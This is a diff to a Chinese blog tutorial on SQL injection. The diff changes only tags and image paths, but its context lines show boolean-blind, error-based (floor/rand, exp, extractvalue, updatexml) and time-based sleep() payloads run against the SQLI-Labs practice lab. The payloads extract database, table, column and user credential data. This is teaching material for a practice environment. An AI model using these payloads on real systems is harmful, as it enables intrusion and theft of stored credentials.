@@ -1,6 +1,8 @@
 ---
 title: SQL注入全解
 date: 2019-03-06 05:03:38
+tags:
+ - 注入
 ---
 Tip: 这篇将详细介绍盲注/报错/时间延迟注入等三种注入,并在测试环境SQLI-Labs中实现注入;这里说下,[SQLI-Labs](https://github.com/Audi-1/sqli-labs)相比大家都知道其内部实验主要关注SQL注入,且分类众多,对于想学习手工注入、SQL注入可以本地搭建环境进行测试.
 
@@ -34,7 +36,7 @@ Left(database(),2)>'sh' 需要加第一个字符,否则会爆错的;注意啦啦
 URL:猜测第一个字符是否大于'i'字符
 http://sqli-labs.me:8888/Less-6/?id=1" and left(database(),1)>'i'--+
 ```
-![](images/sql-bool/bool1.jpg)
+![bool1](/images/sqlall/bool1.jpg)
 ```BASH
 URL:确定第一个字符是s
 http://sqli-labs.me:8888/Less-6/?id=1" and left(database(),1)='s'--+
@@ -55,13 +57,13 @@ URL:
 http://sqli-labs.me:8888/Less-6/?id=1" and left((select schema_name from information_schema.schemata limit
 0,1),1)='i'--+
 ```
-![](images/sql-bool/bool2.jpg)
+![bool2](/images/sqlall/bool2.jpg)
 ```BASH
 其他URL:
 http://sqli-labs.me:8888/Less-6/?id=1" and left((select schema_name from information_schema.schemata limit
 0,1),12)='information_'--+
 ```
-![](images/sql-bool/bool3.jpg)
+![bool3](/images/sqlall/bool3.jpg)
 
 1.1.2.1.第一张表
 
@@ -71,7 +73,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" and left((select table_name from informat
 table_schema='security' limit 0,1),1)='e'--+
 ```
 
-![](images/sql-bool/bool4.jpg)
+![bool4](/images/sqlall/bool4.jpg)
 
 ```bash
 其他URL:
@@ -87,7 +89,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" and left((select table_name from informat
 table_schema='security' limit 1,1),1)='r'--+
 ```
 
-![](images/sql-bool/bool5.jpg)
+![bool5](/images/sqlall/bool5.jpg)
 
 ```bash
 URL:
@@ -105,7 +107,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" and left((select column_name from informa
 table_name='users' limit 0,1),1)='i'--+
 ```
 
-![](images/sql-bool/bool6.jpg)
+![bool6](/images/sqlall/bool6.jpg)
 
 ```bash
 其他URL:
@@ -122,7 +124,7 @@ URL:注意:第一个username是D,大写字符,但是这里无法区分大小写;
 http://sqli-labs.me:8888/Less-6/?id=1" and left((select username from security.users limit 0,1),1)='d'--+
 ```
 
-![](images/sql-bool/bool7.jpg)
+![bool7](/images/sqlall/bool7.jpg)
 
 ```bash
 其他URL:
@@ -155,7 +157,7 @@ URL:
 http://sqli-labs.me:8888/Less-6/?id=1" and ascii(substr((select database()),1,1))=115 --+
 ```
 
-![](images/sql-bool/bool8.jpg)
+![bool8](/images/sqlall/bool8.jpg)
 
 ```bash
 其他URL:101—>'e'
@@ -177,7 +179,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" and ascii(substr((select table_name from 
 table_schema='security' limit 0,1),1,1))=101 --+
 ```
 
-![](images/sql-bool/bool9.jpg)
+![bool9](/images/sqlall/bool9.jpg)
 
 ```bash
 其他URL:
@@ -195,7 +197,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" and ascii(substr((select column_name from
 table_name='users' limit 0,1),1,1))=105 --+
 ```
 
-![](images/sql-bool/bool10.jpg)
+![bool10](/images/sqlall/bool10.jpg)
 
 ```bash
 其他URL:
@@ -223,7 +225,7 @@ URL:第一个字符的ASCII码
 http://sqli-labs.me:8888/Less-6/?id=1" and ord(mid((select database()),1,1))=115--+
 ```
 
-![](images/sql-bool/bool12.jpg)
+![bool12](/images/sqlall/bool12.jpg)
 
 ```bash
 其他URL:
@@ -249,7 +251,7 @@ URL:
 http://sqli-labs.me:8888/Less-6/?id=1" and 1=(select 1 and database() regexp '^[a-z]' limit 0,1) --+
 ```
 
-![](images/sql-bool/bool13.jpg)
+![bool13](/images/sqlall/bool13.jpg)
 
 ```bash
 其他URL:
@@ -264,7 +266,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" and 1=(select 1 from information_schema.t
 table_name regexp '^[a-s]' limit 0,1) --+
 ```
 
-![](images/sql-bool/bool14.jpg)
+![bool14](/images/sqlall/bool14.jpg)
 
 ```bash
 其他URL:
@@ -296,7 +298,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" union select 1,count(*),concat(0x3a,(sele
 information_schema.columns group by a --+
 ````
 
-![](images/sql-bool/bool15.jpg)
+![bool15](/images/sqlall/bool15.jpg)
 
 ### 2.1.1.爆库
 
@@ -306,7 +308,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" union select 1,count(*),concat(0x3a,(sele
 information_schema.schemata limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+
 ```
 
-![](images/sql-bool/bool16.jpg)
+![bool16](/images/sqlall/bool16.jpg)
 
 ```bash
 其他URL:
@@ -323,7 +325,7 @@ information_schema.tables where table_schema='security' limit 0,1),0x3a,floor(ra
 information_schema.columns group by a --+
 ```
 
-![](images/sql-bool/bool17.jpg)
+![bool17](/images/sqlall/bool17.jpg)
 
 ```bash
 其他URL:
@@ -341,7 +343,7 @@ information_schema.columns where table_name='users' limit 0,1),0x3a,floor(rand(0
 group by a --+
 ```
 
-![](images/sql-bool/bool18.jpg)
+![bool18](/images/sqlall/bool18.jpg)
 
 ```bash
 其他URL:
@@ -358,7 +360,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" union select 1,scount(*),concat(0x3a,(sel
 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+
 ```
 
-![](images/sql-bool/bool19.jpg)
+![bool19](/images/sqlall/bool19.jpg)
 
 ```bash
 其他URL:
@@ -376,7 +378,7 @@ URL：备注：使用EXP函数进行报错时，必须得知列长，如：这�
 http://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+	
 ```
 
-![](images/sql-bool/bool21.jpg)
+![bool21](/images/sqlall/bool21.jpg)
 
 如果列数量不对时会报错;
 
@@ -393,7 +395,7 @@ http://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT 
 information_schema.schemata limit 0,1)a))),2,3--+
 ```
 
-![](images/sql-bool/bool23.jpg)
+![bool23](/images/sqlall/bool23.jpg)
 
 ```bash
 第二个数据库:
@@ -409,7 +411,7 @@ http://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT 
 information_schema.tables where table_schema='security' limit 0,1)a))),2,3--+
 ```
 
-![](images/sql-bool/bool24.jpg)
+![bool24](/images/sqlall/bool24.jpg)
 
 ```bash
 第三张表:
@@ -433,7 +435,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" union select (exp(~(select * FROM(SELECT 
 0,1)a))),2,3 --+
 ```
 
-![](images/sql-bool/bool26.jpg)
+![bool26](/images/sqlall/bool26.jpg)
 
 ```bash
 URL:
@@ -449,7 +451,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" union select (exp(~(select * FROM(SELECT 
 concat(0x3a,username,0x3a,password) from security.users limit 0,1)a))),2,3 --+
 ```
 
-![](images/sql-bool/bool27.jpg)
+![bool27](/images/sqlall/bool27.jpg)
 
 ```bash
 URL:
@@ -469,7 +471,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" union select (!(select * from (select sch
 information_schema.schemata limit 0,1)x) - ~0),2,3--+
 ```
 
-![](images/sql-bool/bool29.jpg)
+![bool29](/images/sqlall/bool29.jpg)
 
 ```bash
 URL:
@@ -485,7 +487,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" union select (!(select * from (select tab
 where table_schema='security' limit 0,1)x) - ~0),2,3--+
 ```
 
-![](images/sql-bool/bool30.jpg)
+![bool30](/images/sqlall/bool30.jpg)
 
 ```bash
 URL:
@@ -501,7 +503,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" union select (!(select * from (select col
 where table_name='users' limit 0,1)x) - ~0),2,3--+
 ````
 
-![](images/sql-bool/bool31.jpg)
+![bool31](/images/sqlall/bool31.jpg)
 
 ```bash
 URL:
@@ -517,7 +519,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" union select (!(select * from (select use
 ~0),2,3--+
 ```
 
-![](images/sql-bool/bool32.jpg)
+![bool32](/images/sqlall/bool32.jpg)
 
 ```bash
 URL:
@@ -540,7 +542,7 @@ URL:
 http://sqli-labs.me:8888/Less-6/?id=1” and extractvalue(1,concat(0x7e,(select database()),0x7e))--+
 ```
 
-![](images/sql-bool/bool34.jpg)
+![bool34](/images/sqlall/bool34.jpg)
 
 ```bash
 URL:
@@ -555,7 +557,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" and extractvalue(1,concat(0x7e,(select ta
 where table_schema='security' limit 0,1),0x7e))--+
 ```
 
-![](images/sql-bool/bool36.jpg)
+![bool36](/images/sqlall/bool36.jpg)
 
 #### 2.4.1.3.爆字段
 
@@ -565,7 +567,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" and extractvalue(1,concat(0x7e,(select co
 information_schema.columns where table_name='users' limit 0,1),0x7e))--+
 ```
 
-![](images/sql-bool/bool37.jpg)
+![bool37](/images/sqlall/bool37.jpg)
 
 #### 2.4.1.6.爆数据
 
@@ -575,7 +577,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" and extractvalue(1,concat(0x7e,(select us
 0,1),0x7e))--+
 ````
 
-![](images/sql-bool/bool38.jpg)
+![bool38](/images/sqlall/bool38.jpg)
 
 ### 2.4.2.Xpath注入之updatexml()
 
@@ -586,7 +588,7 @@ URL:
 http://sqli-labs.me:8888/Less-6/?id=1" and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
 ```
 
-![](images/sql-bool/bool40.jpg)
+![bool40](/images/sqlall/bool40.jpg)
 
 ```bash
 URL:
@@ -601,7 +603,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" and updatexml(1,concat(0x7e,(select table
 where table_schema='security' limit 0,1),0x7e),1)--+
 ```
 
-![](images/sql-bool/bool41.jpg)
+![bool41](/images/sqlall/bool41.jpg)
 
 ```bash
 URL:
@@ -617,7 +619,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" and updatexml(1,concat(0x7e,(select colum
 where table_name='users' limit 0,1),0x7e),1)--+
 ```
 
-![](images/sql-bool/bool42.jpg)
+![bool42](/images/sqlall/bool42.jpg)
 
 ```bash
 URL:
@@ -633,7 +635,7 @@ http://sqli-labs.me:8888/Less-6/?id=1" and updatexml(1,concat(0x7e,(select usern
 0,1),0x7e),1)--+
 ```
 
-![](images/sql-bool/bool43.jpg)
+![bool43](/images/sqlall/bool43.jpg)
 
 ```bash
 URL:
@@ -653,7 +655,7 @@ ascii()=ascii码 //转换成ascii码
 substr("string",strart,length) //mid()也一样，取出字符串里的第几位开始，长度多少的字符.
 原理： 延时注入的原理就是，所要爆的信息的ascii码正确时,产生延时,否则不延时。实例如下所示
 
-![](images/sql-bool/bool45.jpg)
+![bool45](/images/sqlall/bool45.jpg)
 
 解析：
 0、mysql> select if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1);
@@ -674,7 +676,7 @@ URL:
 http://sqli-labs.me:8888/Less-10/?id=1
 ```
 
-![](images/sql-bool/bool46.jpg)
+![bool46](/images/sqlall/bool46.jpg)
 
 #### 3.1.2.尝试双引号测试注入
 
@@ -684,7 +686,7 @@ URL:浏览器出现延时,注意网络稳定性,不然会出现混淆;
 http://sqli-labs.me:8888/Less-10/?id=1" and sleep(5)--+
 ```
 
-![](images/sql-bool/bool47.jpg)
+![bool47](/images/sqlall/bool47.jpg)
 
 #### 3.1.3.爆库
 
@@ -693,7 +695,7 @@ URL：115—>s
 http://sqli-labs.me:8888/Less-10/?id=1" and if(ord(mid(database(),1,1))=115,sleep(5),1)--+
 ````
 
-![](images/sql-bool/bool48.jpg)
+![bool48](/images/sqlall/bool48.jpg)
 
 #### 3.1.5.爆表
 
@@ -703,7 +705,7 @@ http://sqli-labs.me:8888/Less-10/?id=1" and if(ord(mid((select table_name from i
 table_schema='security' limit 0,1),1,1))=101,sleep(5),1)--+
 ````
 
-![](images/sql-bool/bool50.jpg)
+![bool50](/images/sqlall/bool50.jpg)
 
 #### 3.1.6.爆字段
 
@@ -713,7 +715,7 @@ http://sqli-labs.me:8888/Less-10/?id=1" and if(ord(mid((select column_name from 
 table_name='users' limit 0,1),1,1))=105,sleep(5),1)--+
 ```
 
-![](images/sql-bool/bool51.jpg)
+![bool51](/images/sqlall/bool51.jpg)
 
 #### 3.1.7.爆数据
 
@@ -723,6 +725,6 @@ http://sqli-labs.me:8888/Less-10/?id=1" and if(ord(mid((select username from sec
 0,1),1,1))=68,sleep(5),1)--+
 ```
 
-![](images/sql-bool/bool52.jpg)
+![bool52](/images/sqlall/bool52.jpg)
 
 其他字段信息请自行搭建环境测试,
